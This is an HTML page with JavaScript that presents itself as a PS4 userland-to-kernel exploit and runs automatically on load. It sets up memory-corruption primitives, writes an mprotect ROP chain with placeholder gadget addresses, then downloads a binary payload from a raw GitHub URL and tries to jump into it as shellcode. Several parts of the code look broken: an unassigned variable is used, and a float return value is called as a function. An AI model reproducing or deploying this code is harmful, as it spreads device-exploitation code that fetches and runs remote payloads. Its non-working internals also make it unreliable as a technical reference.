<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>PS4 Userland → Kernel Exploit Test</title>
  <style>
    body { background: #000; color: #0f0; font-family: monospace; padding: 10px; white-space: pre-wrap; }
    #log { max-height: 80vh; overflow-y: auto; }
  </style>
</head>
<body>
  <h1>PS4 Userland → Kernel Exploit Test</h1>
  <div id="log">inicializando…</div>
  <script>
    const logEl = document.getElementById('log');
    let logData = "";
    function log(msg) {
      logData += msg + "\n";
      logEl.textContent = logData;
      logEl.scrollTop = logEl.scrollHeight;
    }

    // Float <-> Int conversion
    const buf = new ArrayBuffer(8);
    const f64 = new Float64Array(buf);
    const u32 = new Uint32Array(buf);
    function f2i(f){ f64[0]=f; return BigInt(u32[0]) + (BigInt(u32[1])<<32n); }
    function i2f(i){ u32[0]=Number(i & 0xffffffffn); u32[1]=Number(i>>32n); return f64[0]; }

    // Type confusion primitives
    let corrupt;
    function makeCorruptArray() {
      let arr = [1.1, 1.1, 1.1];
      let trigger = { valueOf(){ arr.length = 1; return 3; } };
      return arr.map((x,i,a) => { if(i===1) a.length = trigger; return x; });
    }

    let addrof, fakeobj, arb_read, arb_write;
    function setupPrimitives() {
      log("[+] setupPrimitives()");
      corrupt = makeCorruptArray();
      log("    corrupt[1] (leak) = " + corrupt[1]);
      let leak = f2i(corrupt[1]);
      log("    backing ptr leak = 0x" + leak.toString(16));
      let victim_buf = new ArrayBuffer(0x2000);
      let victim_f64 = new Float64Array(victim_buf);

      corrupt[1] = i2f(leak);

      addrof = obj => {
        victim_f64[0] = obj;
        return f2i(corrupt[1]);
      };
      fakeobj = addr => {
        corrupt[1] = i2f(addr);
        return new Float64Array(victim_buf)[0];
      };
      arb_read = addr => {
        corrupt[1] = i2f(addr);
        return f2i(victim_f64[1]);
      };
      arb_write = (addr, val) => {
        corrupt[1] = i2f(addr);
        victim_f64[1] = i2f(val);
      };

      log("    primitivas configuradas");
    }

    let shellcodeAddr;
    function buildROP() {
      log("[+] buildROP()");
      let sc_buf = new ArrayBuffer(0x1000);
      shellcodeAddr = f2i(corrupt[1]);
      log("    shellcode buffer @ 0x" + shellcodeAddr.toString(16));

      // Gadgets - (endereços fictícios! só pra ilustrar; no PS4 real seriam leakados)
      let pop_rdi = 0x41414141n;
      let pop_rsi = 0x42424242n;
      let pop_rdx = 0x43434343n;
      let mprotect_syscall = 0x44444444n;

      let rop = [
        pop_rdi,
        shellcodeAddr,
        pop_rsi,
        0x1000n,
        pop_rdx,
        7n,
        mprotect_syscall,
        shellcodeAddr
      ];

      let dv = new DataView(sc_buf);
      for(let i=0; i<rop.length; i++){
        dv.setBigUint64(i*8, rop[i], true);
      }
      log("    ROPChain escrita no buffer");

      return sc_buf;
    }

    async function injectAndRun(sc_buf) {
      log("[+] injectAndRun()");
      try {
        log("[+] baixando shellcode...");
        let resp = await fetch("https://raw.githubusercontent.com/NICKZZIN/SITEX/main/aio.bin");
        if (!resp.ok) throw new Error("falha no download do payload");
        let payload = new Uint8Array(await resp.arrayBuffer());
        log("    payload baixado (" + payload.length + " bytes)");

        let dv = new DataView(sc_buf);
        for(let i = 0; i < payload.length; i++) {
          dv.setUint8((rop.length * 8) + i, payload[i]);
        }
        log("    payload injetado no buffer");

        log("    disparando shellcode...");

        let fn = fakeobj(shellcodeAddr);
        fn(); // SALTA pro shellcode
      } catch (e) {
        log("!!! erro exploit: " + e);
      }
    }

    //– Executa tudo
    let rop;
    setTimeout(() => {
      try {
        log("=== Exploit start ===");
        setupPrimitives();
        let sc_buf = buildROP();
        injectAndRun(sc_buf);
        log("=== fim ===");
      } catch(e) {
        log("!!! erro exploit: " + e);
      }
    }, 1000);
  </script>
</body>
</html>
